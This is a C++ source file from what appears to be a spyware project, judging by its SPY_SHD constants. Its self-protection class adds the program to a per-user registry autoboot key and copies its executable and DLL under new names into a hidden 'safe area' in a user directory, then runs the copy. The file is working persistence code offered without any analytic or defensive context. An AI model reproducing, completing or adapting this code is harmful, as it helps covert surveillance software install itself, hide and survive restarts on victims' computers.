#include "selfprt.h"
#include "reg.h"
#include "../proc.h"
#include "../fso.h"
#include <Shlobj.h>

void SelfPrt::auto_startup()
{
	Reg * reg = NULL;
	char * file_path = new char[MAX_PATH];
	if (GetModuleFileNameA(NULL, file_path, MAX_PATH) > 0)
	{
		char * valid_file_path = new char[MAX_PATH];
		strcpy(valid_file_path, "\"");
		strcat(valid_file_path, file_path);
		strcat(valid_file_path, "\"");
		try
		{
			reg = new Reg(HKEY_CURRENT_USER, SPY_SHD_AUTOBOOT_HKEY);

			if (reg->write_value_sz(SPY_SHD_AUTOBOOT_APPNAME, valid_file_path))
				LOG_I("Enabled auto startup feature!");
		}
		catch (int error)
		{
			LOG_E("Can not enable auto startup feature: %d", error);
		}
		delete[] valid_file_path;
		if (reg != NULL)
			delete reg;
	}
	delete[] file_path;
}

bool SelfPrt::move_to_safearea()
{
	char * appdata = new char[MAX_PATH];
	bool moved = false;
	if (FSO::get_special_dir(SPY_SHD_SAFEAREA_DIR, appdata))
	{
		char * dst_dir_path = new char[MAX_PATH];
		FSO::path_combine(dst_dir_path, appdata, SPY_SHD_SAFEAREA_SUBDIR);
		char * dst_file = new char[MAX_PATH];
		FSO::path_combine(dst_file, dst_dir_path, SPY_SHD_SAFEAREA_DST_EXENAME);
		if (!FSO::file_exists(dst_file))
		{
			int ret = FSO::make_dir(dst_dir_path);
			if (ret != ERROR_SUCCESS && ret != ERROR_ALREADY_EXISTS && ret != ERROR_FILE_EXISTS)
			{
				LOG_E("Make directory is failed: %d", ret);
			}
			else
			{
				char * src_dir_path = new char[MAX_PATH];
				FSO::get_dir_path(src_dir_path);

				char * src_file = new char[MAX_PATH];

				FSO::path_combine(dst_file, dst_dir_path, SPY_SHD_SAFEAREA_DST_DLLNAME);
				FSO::path_combine(src_file, src_dir_path, SPY_SHD_SAFEAREA_SRC_DLLNAME);
				FSO::copy_file(src_file, dst_file);

				FSO::path_combine(dst_file, dst_dir_path, SPY_SHD_SAFEAREA_DST_EXENAME);
				FSO::path_combine(src_file, src_dir_path, SPY_SHD_SAFEAREA_SRC_EXENAME);
				FSO::copy_file(src_file, dst_file);

				FSO::_run(dst_file);

				delete[] src_file;
				delete[] src_dir_path;

				moved = true;
			}
		}
		delete[] dst_file;
		delete[] dst_dir_path;
	}
	delete[] appdata;
	return moved;
}
